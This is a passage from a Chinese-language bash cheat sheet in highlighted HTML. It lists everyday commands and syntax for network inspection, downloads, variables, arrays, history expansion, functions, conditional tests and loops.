class="hljs-comment"># 查看所有 TCP 链接</span><br>netstat -lntu             <span class="hljs-comment"># 显示所有正在监听的 TCP 和 UDP 信息</span><br>netstat -lntup            <span class="hljs-comment"># 显示所有正在监听的 socket 及进程信息</span><br>netstat -i                <span class="hljs-comment"># 显示网卡信息</span><br>netstat -rn               <span class="hljs-comment"># 显示当前系统路由表，同 route -n</span><br>ss -an                    <span class="hljs-comment"># 比 netstat -an 更快速更详细</span><br>ss -s                     <span class="hljs-comment"># 统计 TCP 的 established, wait 等</span><br><br>wget &#123;url&#125;                <span class="hljs-comment"># 下载文件，可加 --no-check-certificate 忽略 ssl 验证</span><br>wget -qO- &#123;url&#125;           <span class="hljs-comment"># 下载文件并输出到标准输出（不保存）</span><br>curl -sL &#123;url&#125;            <span class="hljs-comment"># 同 wget -qO- &#123;url&#125; 没有 wget 的时候使用</span><br><br>sz &#123;file&#125;                 <span class="hljs-comment"># 发送文件到终端，zmodem 协议</span><br>rz                        <span class="hljs-comment"># 接收终端发送过来的文件</span><br></code></pre></td></tr></table></figure><h2 id="变量操作"><a href="#变量操作" class="headerlink" title="变量操作"></a>变量操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">varname=value             <span class="hljs-comment"># 定义变量</span><br>varname=value <span class="hljs-built_in">command</span>     <span class="hljs-comment"># 定义子进程变量并执行子进程</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$varname</span>             <span class="hljs-comment"># 查看变量内容</span><br><span class="hljs-built_in">echo</span> $$                   <span class="hljs-comment"># 查看当前 shell 的进程号</span><br><span class="hljs-built_in">echo</span> $!                   <span class="hljs-comment"># 查看最近调用的后台任务进程号</span><br><span class="hljs-built_in">echo</span> $?                   <span class="hljs-comment"># 查看最近一条命令的返回码</span><br><span class="hljs-built_in">export</span> VARNAME=value      <span class="hljs-comment"># 设置环境变量（将会影响到子进程）</span><br><br>array[0]=valA             <span class="hljs-comment"># 定义数组</span><br>array[1]=valB<br>array[2]=valC<br>array=([0]=valA [1]=valB [2]=valC)   <span class="hljs-comment"># 另一种方式</span><br>array=(valA valB valC)               <span class="hljs-comment"># 另一种方式</span><br><br><span class="hljs-variable">$&#123;array[i]&#125;</span>               <span class="hljs-comment"># 取得数组中的元素</span><br><span class="hljs-variable">$&#123;#array[@]&#125;</span>              <span class="hljs-comment"># 取得数组的长度</span><br><span class="hljs-variable">$&#123;#array[i]&#125;</span>              <span class="hljs-comment"># 取得数组中某个变量的长度</span><br><br><span class="hljs-built_in">declare</span> -a                <span class="hljs-comment"># 查看所有数组</span><br><span class="hljs-built_in">declare</span> -f                <span class="hljs-comment"># 查看所有函数</span><br><span class="hljs-built_in">declare</span> -F                <span class="hljs-comment"># 查看所有函数，仅显示函数名</span><br><span class="hljs-built_in">declare</span> -i                <span class="hljs-comment"># 查看所有整数</span><br><span class="hljs-built_in">declare</span> -r                <span class="hljs-comment"># 查看所有只读变量</span><br><span class="hljs-built_in">declare</span> -x                <span class="hljs-comment"># 查看所有被导出成环境变量的东西</span><br><span class="hljs-built_in">declare</span> -p varname        <span class="hljs-comment"># 输出变量是怎么定义的（类型+值）</span><br><br><span class="hljs-variable">$&#123;varname:-word&#125;</span>          <span class="hljs-comment"># 如果变量不为空则返回变量，否则返回 word</span><br><span class="hljs-variable">$&#123;varname:=word&#125;</span>          <span class="hljs-comment"># 如果变量不为空则返回变量，否则赋值成 word 并返回</span><br><span class="hljs-variable">$&#123;varname:?message&#125;</span>       <span class="hljs-comment"># 如果变量不为空则返回变量，否则打印错误信息并退出</span><br><span class="hljs-variable">$&#123;varname:+word&#125;</span>          <span class="hljs-comment"># 如果变量不为空则返回 word，否则返回 null</span><br><span class="hljs-variable">$&#123;varname:offset:len&#125;</span>     <span class="hljs-comment"># 取得字符串的子字符串</span><br><br><span class="hljs-variable">$&#123;variable#pattern&#125;</span>       <span class="hljs-comment"># 如果变量头部匹配 pattern，则删除最小匹配部分返回剩下的</span><br><span class="hljs-variable">$&#123;variable##pattern&#125;</span>      <span class="hljs-comment"># 如果变量头部匹配 pattern，则删除最大匹配部分返回剩下的</span><br><span class="hljs-variable">$&#123;variable%pattern&#125;</span>       <span class="hljs-comment"># 如果变量尾部匹配 pattern，则删除最小匹配部分返回剩下的</span><br><span class="hljs-variable">$&#123;variable%%pattern&#125;</span>      <span class="hljs-comment"># 如果变量尾部匹配 pattern，则删除最大匹配部分返回剩下的</span><br><span class="hljs-variable">$&#123;variable/pattern/str&#125;</span>   <span class="hljs-comment"># 将变量中第一个匹配 pattern 的替换成 str，并返回</span><br><span class="hljs-variable">$&#123;variable//pattern/str&#125;</span>  <span class="hljs-comment"># 将变量中所有匹配 pattern 的地方替换成 str 并返回</span><br><br><span class="hljs-variable">$&#123;#varname&#125;</span>               <span class="hljs-comment"># 返回字符串长度</span><br><br>*(patternlist)            <span class="hljs-comment"># 零次或者多次匹配</span><br>+(patternlist)            <span class="hljs-comment"># 一次或者多次匹配</span><br>?(patternlist)            <span class="hljs-comment"># 零次或者一次匹配</span><br>@(patternlist)            <span class="hljs-comment"># 单词匹配</span><br>!(patternlist)            <span class="hljs-comment"># 不匹配</span><br><br>array=(<span class="hljs-variable">$text</span>)             <span class="hljs-comment"># 按空格分隔 text 成数组，并赋值给变量</span><br>IFS=<span class="hljs-string">&quot;/&quot;</span> array=(<span class="hljs-variable">$text</span>)     <span class="hljs-comment"># 按斜杆分隔字符串 text 成数组，并赋值给变量</span><br>text=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;array[*]&#125;</span>&quot;</span>        <span class="hljs-comment"># 用空格链接数组并赋值给变量</span><br>text=$(IFS=/; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;array[*]&#125;</span>&quot;</span>)  <span class="hljs-comment"># 用斜杠链接数组并赋值给变量</span><br><br>A=( foo bar <span class="hljs-string">&quot;a  b c&quot;</span> 42 ) <span class="hljs-comment"># 数组定义</span><br>B=(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;A[@]:1:2&#125;</span>&quot;</span>)         <span class="hljs-comment"># 数组切片：B=( bar &quot;a  b c&quot; )</span><br>C=(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;A[@]:1&#125;</span>&quot;</span>)           <span class="hljs-comment"># 数组切片：C=( bar &quot;a  b c&quot; 42 )</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;B[@]&#125;</span>&quot;</span>            <span class="hljs-comment"># bar a  b c</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;B[1]&#125;</span>&quot;</span>            <span class="hljs-comment"># a  b c</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;C[@]&#125;</span>&quot;</span>            <span class="hljs-comment"># bar a  b c 42</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;C[@]: -2:2&#125;</span>&quot;</span>      <span class="hljs-comment"># a  b c 42  减号前的空格是必须的</span><br><br>$(UNIX <span class="hljs-built_in">command</span>)           <span class="hljs-comment"># 运行命令，并将标准输出内容捕获并返回</span><br>varname=$(<span class="hljs-built_in">id</span> -u user)     <span class="hljs-comment"># 将用户名为 user 的 uid 赋值给 varname 变量</span><br><br>num=$(<span class="hljs-built_in">expr</span> 1 + 2)         <span class="hljs-comment"># 兼容 posix sh 的计算，使用 expr 命令计算结果</span><br>num=$(<span class="hljs-built_in">expr</span> <span class="hljs-variable">$num</span> + 1)      <span class="hljs-comment"># 数字自增</span><br><span class="hljs-built_in">expr</span> 2 \* \( 2 + 3 \)     <span class="hljs-comment"># 兼容 posix sh 的复杂计算，输出 10</span><br><br>num=$((<span class="hljs-number">1</span> + <span class="hljs-number">2</span>))            <span class="hljs-comment"># 计算 1+2 赋值给 num，使用 bash 独有的 $((..)) 计算</span><br>num=$((<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>))         <span class="hljs-comment"># 变量递增</span><br>num=$((num + <span class="hljs-number">1</span>))          <span class="hljs-comment"># 变量递增，双括号内的 $ 可以省略</span><br>num=$((<span class="hljs-number">1</span> + (<span class="hljs-number">2</span> + <span class="hljs-number">3</span>) * <span class="hljs-number">2</span>))  <span class="hljs-comment"># 复杂计算</span><br><br></code></pre></td></tr></table></figure><h2 id="事件指示符"><a href="#事件指示符" class="headerlink" title="事件指示符"></a>事件指示符</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">!!                  <span class="hljs-comment"># 上一条命令</span><br>!^                  <span class="hljs-comment"># 上一条命令的第一个单词</span><br>!:n                 <span class="hljs-comment"># 上一条命令的第n个单词</span><br>!:n-$               <span class="hljs-comment"># 上一条命令的第n个单词到最后一个单词</span><br>!$                  <span class="hljs-comment"># 上一条命令的最后一个单词</span><br>!-n:$               <span class="hljs-comment"># 上n条命令的最后一个单词</span><br>!string             <span class="hljs-comment"># 最近一条包含string的命令</span><br>!^string1^string2   <span class="hljs-comment"># 最近一条包含string1的命令, 快速替换string1为string2</span><br>!<span class="hljs-comment">#                  # 本条命令之前所有的输入内容</span><br>!<span class="hljs-comment">#:n                # 本条命令之前的第n个单词, 快速备份cp /etc/passwd !#:1.bak</span><br></code></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="定义一个新函数"><a href="#定义一个新函数" class="headerlink" title="定义一个新函数"></a>定义一个新函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">myfunc</span></span>() &#123;<br>    <span class="hljs-comment"># $1 代表第一个参数，$N 代表第 N 个参数</span><br>    <span class="hljs-comment"># $# 代表参数个数</span><br>    <span class="hljs-comment"># $0 代表被调用者自身的名字</span><br>    <span class="hljs-comment"># $@ 代表所有参数，类型是个数组，想传递所有参数给其他命令用 cmd &quot;$@&quot; </span><br>    <span class="hljs-comment"># $* 空格链接起来的所有参数，类型是字符串</span><br>    &#123;shell commands ...&#125;<br>&#125;<br><br>myfunc                    <span class="hljs-comment"># 调用函数 myfunc </span><br>myfunc arg1 arg2 arg3     <span class="hljs-comment"># 带参数的函数调用</span><br>myfunc <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span>               <span class="hljs-comment"># 将所有参数传递给函数</span><br>myfunc <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;array[@]&#125;</span>&quot;</span>      <span class="hljs-comment"># 将一个数组当作多个参数传递给函数</span><br><span class="hljs-built_in">shift</span>                     <span class="hljs-comment"># 参数左移</span><br><br><span class="hljs-built_in">unset</span> -f myfunc           <span class="hljs-comment"># 删除函数</span><br><span class="hljs-built_in">declare</span> -f                <span class="hljs-comment"># 列出函数定义</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="条件判断（兼容-posix-sh-的条件判断）：man-test"><a href="#条件判断（兼容-posix-sh-的条件判断）：man-test" class="headerlink" title="条件判断（兼容 posix sh 的条件判断）：man test"></a>条件判断（兼容 posix sh 的条件判断）：man test</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">statement1 &amp;&amp; statement2  <span class="hljs-comment"># and 操作符</span><br>statement1 || statement2  <span class="hljs-comment"># or 操作符</span><br><br>exp1 -a exp2              <span class="hljs-comment"># exp1 和 exp2 同时为真时返回真（POSIX XSI扩展）</span><br>exp1 -o exp2              <span class="hljs-comment"># exp1 和 exp2 有一个为真就返回真（POSIX XSI扩展）</span><br>( expression )            <span class="hljs-comment"># 如果 expression 为真时返回真，输入注意括号前反斜杆</span><br>! expression              <span class="hljs-comment"># 如果 expression 为假那返回真</span><br><br>str1 = str2               <span class="hljs-comment"># 判断字符串相等，如 [ &quot;$x&quot; = &quot;$y&quot; ] &amp;&amp; echo yes</span><br>str1 != str2              <span class="hljs-comment"># 判断字符串不等，如 [ &quot;$x&quot; != &quot;$y&quot; ] &amp;&amp; echo yes</span><br>str1 &lt; str2               <span class="hljs-comment"># 字符串小于，如 [ &quot;$x&quot; \&lt; &quot;$y&quot; ] &amp;&amp; echo yes</span><br>str2 &gt; str2               <span class="hljs-comment"># 字符串大于，注意 &lt; 或 &gt; 是字面量，输入时要加反斜杆</span><br>-n str1                   <span class="hljs-comment"># 判断字符串不为空（长度大于零）</span><br>-z str1                   <span class="hljs-comment"># 判断字符串为空（长度等于零）</span><br><br>-a file                   <span class="hljs-comment"># 判断文件存在，如 [ -a /tmp/abc ] &amp;&amp; echo &quot;exists&quot;</span><br>-d file                   <span class="hljs-comment"># 判断文件存在，且该文件是一个目录</span><br>-e file                   <span class="hljs-comment"># 判断文件存在，和 -a 等价</span><br>-f file                   <span class="hljs-comment"># 判断文件存在，且该文件是一个普通文件（非目录等）</span><br>-r file                   <span class="hljs-comment"># 判断文件存在，且可读</span><br>-s file                   <span class="hljs-comment"># 判断文件存在，且尺寸大于0</span><br>-w file                   <span class="hljs-comment"># 判断文件存在，且可写</span><br>-x file                   <span class="hljs-comment"># 判断文件存在，且执行</span><br>-N file                   <span class="hljs-comment"># 文件上次修改过后还没有读取过</span><br>-O file                   <span class="hljs-comment"># 文件存在且属于当前用户</span><br>-G file                   <span class="hljs-comment"># 文件存在且匹配你的用户组</span><br>file1 -nt file2           <span class="hljs-comment"># 文件1 比 文件2 新</span><br>file1 -ot file2           <span class="hljs-comment"># 文件1 比 文件2 旧</span><br><br>num1 -eq num2             <span class="hljs-comment"># 数字判断：num1 == num2</span><br>num1 -ne num2             <span class="hljs-comment"># 数字判断：num1 != num2</span><br>num1 -lt num2             <span class="hljs-comment"># 数字判断：num1 &lt; num2</span><br>num1 -le num2             <span class="hljs-comment"># 数字判断：num1 &lt;= num2</span><br>num1 -gt num2             <span class="hljs-comment"># 数字判断：num1 &gt; num2</span><br>num1 -ge num2             <span class="hljs-comment"># 数字判断：num1 &gt;= num2</span><br><br></code></pre></td></tr></table></figure><h1 id="分支控制：if-和经典-test，兼容-posix-sh-的条件判断语句"><a href="#分支控制：if-和经典-test，兼容-posix-sh-的条件判断语句" class="headerlink" title="分支控制：if 和经典 test，兼容 posix sh 的条件判断语句"></a>分支控制：if 和经典 test，兼容 posix sh 的条件判断语句</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span> &#123;expression&#125;         <span class="hljs-comment"># 判断条件为真的话 test 程序返回0 否则非零</span><br>[ expression ]            <span class="hljs-comment"># 判断条件为真的话返回0 否则非零</span><br><br><span class="hljs-built_in">test</span> <span class="hljs-string">&quot;abc&quot;</span> = <span class="hljs-string">&quot;def&quot;</span>        <span class="hljs-comment"># 查看返回值 echo $? 显示 1，因为条件为假</span><br><span class="hljs-built_in">test</span> <span class="hljs-string">&quot;abc&quot;</span> != <span class="hljs-string">&quot;def&quot;</span>       <span class="hljs-comment"># 查看返回值 echo $? 显示 0，因为条件为真</span><br><br><span class="hljs-built_in">test</span> -a /tmp; <span class="hljs-built_in">echo</span> $?     <span class="hljs-comment"># 调用 test 判断 /tmp 是否存在，并打印 test 的返回值</span><br>[ -a /tmp ]; <span class="hljs-built_in">echo</span> $?      <span class="hljs-comment"># 和上面完全等价，/tmp 肯定是存在的，所以输出是 0</span><br><br><span class="hljs-built_in">test</span> cond &amp;&amp; cmd1         <span class="hljs-comment"># 判断条件为真时执行 cmd1</span><br>[ cond ] &amp;&amp; cmd1          <span class="hljs-comment"># 和上面完全等价</span><br>[ cond ] &amp;&amp; cmd1 || cmd2  <span class="hljs-comment"># 条件为真执行 cmd1 否则执行 cmd2</span><br><br><span class="hljs-comment"># 判断 /etc/passwd 文件是否存在</span><br><span class="hljs-comment"># 经典的 if 语句就是判断后面的命令返回值为0的话，认为条件为真，否则为假</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e /etc/passwd; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;alright it exists ... &quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;it doesn&#x27;t exist ... &quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 和上面完全等价，[ 是个和 test 一样的可执行程序，但最后一个参数必须为 ]</span><br><span class="hljs-comment"># 这个名字为 &quot;[&quot; 的可执行程序一般就在 /bin 或 /usr/bin 下面，比 test 优雅些</span><br><span class="hljs-keyword">if</span> [ -e /etc/passwd ]; <span class="hljs-keyword">then</span>   <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;alright it exists ... &quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;it doesn&#x27;t exist ... &quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 和上面两个完全等价，其实到 bash 时代 [ 已经是内部命令了，用 enable 可以看到</span><br>[ -e /etc/passwd ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;alright it exists&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;it doesn&#x27;t exist&quot;</span><br><br><span class="hljs-comment"># 判断变量的值</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$varname</span>&quot;</span> = <span class="hljs-string">&quot;foo&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;this is foo&quot;</span><br><span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$varname</span>&quot;</span> = <span class="hljs-string">&quot;bar&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;this is bar&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;neither&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 复杂条件判断，注意 || 和 &amp;&amp; 是完全兼容 POSIX 的推荐写法</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$x</span> -gt 10 ] &amp;&amp; [ <span class="hljs-variable">$x</span> -lt 20 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yes, between 10 and 20&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 可以用 &amp;&amp; 命令连接符来做和上面完全等价的事情</span><br>[ <span class="hljs-variable">$x</span> -gt 10 ] &amp;&amp; [ <span class="hljs-variable">$x</span> -lt 20 ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yes, between 10 and 20&quot;</span><br><br><span class="hljs-comment"># 小括号和 -a -o 是 POSIX XSI 扩展写法，小括号是字面量，输入时前面要加反斜杆</span><br><span class="hljs-keyword">if</span> [ \( <span class="hljs-variable">$x</span> -gt 10 \) -a \( <span class="hljs-variable">$x</span> -lt 20 \) ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yes, between 10 and 20&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 同样可以用 &amp;&amp; 命令连接符来做和上面完全等价的事情</span><br>[ \( <span class="hljs-variable">$x</span> -gt 10 \) -a \( <span class="hljs-variable">$x</span> -lt 20 \) ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yes, between 10 and 20&quot;</span><br><br><br><span class="hljs-comment"># 判断程序存在的话就执行</span><br>[ -x /bin/ls ] &amp;&amp; /bin/ls -l<br><br><span class="hljs-comment"># 如果不考虑兼容 posix sh 和 dash 这些的话，可用 bash 独有的 ((..)) 和 [[..]]:</span><br>https://www.ibm.com/developerworks/library/l-bash-test/index.html<br></code></pre></td></tr></table></figure><h1 id="流程控制：while-for-case-until"><a href="#流程控制：while-for-case-until" class="headerlink" title="流程控制：while &#x2F; for &#x2F; case &#x2F; until"></a>流程控制：while &#x2F; for &#x2F; case &#x2F; until</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># while 循环</span><br><span class="hljs-keyword">while</span> condition; <span class="hljs-keyword">do</span><br>    statements<br><span class="hljs-keyword">done</span><br><br>i=1<br><span class="hljs-keyword">while</span> [ <span class="hljs-variable">$i</span> -le 10 ]; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span>; <br>    i=$(<span class="hljs-built_in">expr</span> <span class="hljs-variable">$i</span> + 1)<br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># for 循环：上面的 while 语句等价</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..10&#125;; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">for</span> name [<span class="hljs-keyword">in</span> list]; <span class="hljs-keyword">do</span><br>    statements<br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># for 列举某目录下面的所有文件</span><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> /home/*; <span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$f</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># bash 独有的 (( .. )) 语句，更接近 C 语言，但是不兼容 posix sh</span><br><span class="hljs-keyword">for</span> (( initialisation ; ending condition ; update )); <span class="hljs-keyword">do</span><br>    statements<br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># 和上面的写法等价</span><br><span class="hljs-keyword">for</span> ((i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span>; <span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># case 判断</span><br><span class="hljs-keyword">case</span> expression <span class="hljs-keyword">in</span> <br>    pattern1 )<br>        statements ;;<br>    pattern2 )<br>        statements ;;<br>    * )<br>        otherwise ;;<br><span class="hljs-keyword">esac</span><br><br><span class="hljs-comment"># until 语句</span><br><span class="hljs-keyword">until</span> condition; <span class="hljs-keyword">do</span><br>    statements<br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># select 语句</span><br><span class="hljs-keyword">select</span> name [<span class="hljs-keyword">in</span> list]; <span class="hljs-keyword">do</span><br>  statements that can use <span class="hljs-variable">$name</span><br><span class="hljs-keyword">done</span><br><br></code></pre></td></tr></table></figure><h1 id="命令处理"><a href="#命令处理" class="headerlink" title="命令处理"></a>命令处理</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> <span class="hljs-built_in">ls</span>                         <span class="hljs-comment"># 忽略 alias 直接执行程序或者内建命令 ls</span><br><span class="hljs-built_in">builtin</span> <span class="hljs-built_in">cd</span>                         <span class="hljs-comment"># 忽略 alias 直接运行内建的 cd 命令</span><br><span class="hljs-built_in">enable</span>                             <span class="hljs-comment"># 列出所有 bash 内置命令，或禁止某命令</span><br><span class="hljs-built_in">help</span> &#123;builtin_command&#125;             <span class="hljs-comment"># 查看内置命令的帮助（仅限 bash 内置命令）</span><br><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$script</span>                       <span class="hljs-comment"># 对 script 变量中的字符串求值（执行）</span><br></code></pre></td></tr></table></figure><h1 id="输出-输入-重定向"><a href="#输出-输入-重定向" class="headerlink" title="输出&#x2F;输入 重定向"></a>输出&#x2F;输入 重定向</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 